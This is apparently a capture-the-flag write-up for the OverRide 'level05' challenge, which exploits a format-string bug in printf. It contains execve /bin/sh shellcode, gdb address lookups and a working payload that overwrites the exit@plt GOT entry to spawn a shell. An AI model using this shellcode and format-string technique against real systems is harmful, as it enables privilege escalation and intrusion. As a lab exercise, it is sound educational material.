# level05
## Program behaviour

1. Read a `buffer` from `stdin`
2. Apply `tolower` to each byte of `buffer`
3. Call `printf(buffer)`
4. Call `exit(0)`

## Vulnerability

The program calls `printf` with buffer as format string. This is vunerable to `printf` attacks.

## Exploitation

We need to overwrite with `printf` the address of `exit@plt`

1. Setup an environnement variable containing the shellcode
```sh
export SHCODE=$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

2. Search for the right addresses
    - `0x080497e0` is the address to overwrite
    - `0xffffdf2f` is the address to jump to
```gdb
(gdb) x/s *((char **)environ + 16)
0xffffdf28:	 "SHCODE=\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
(gdb) p/x 0xffffdf28+7
$1 = 0xffffdf2f
(gdb) p/d 0xdf2f
$2 = 57135
(gdb) p/d 0xffff-0xdf2f
$3 = 8400
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

3. Craft and run the `printf` exploit. Note that we need to have the same `env` as `gdb`. Otherwise offsets don't match.
```sh
level05@OverRide:~$ gdb level05 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%57127x%10$hn%8400x%11$hn"'; cat) | ~/level05
```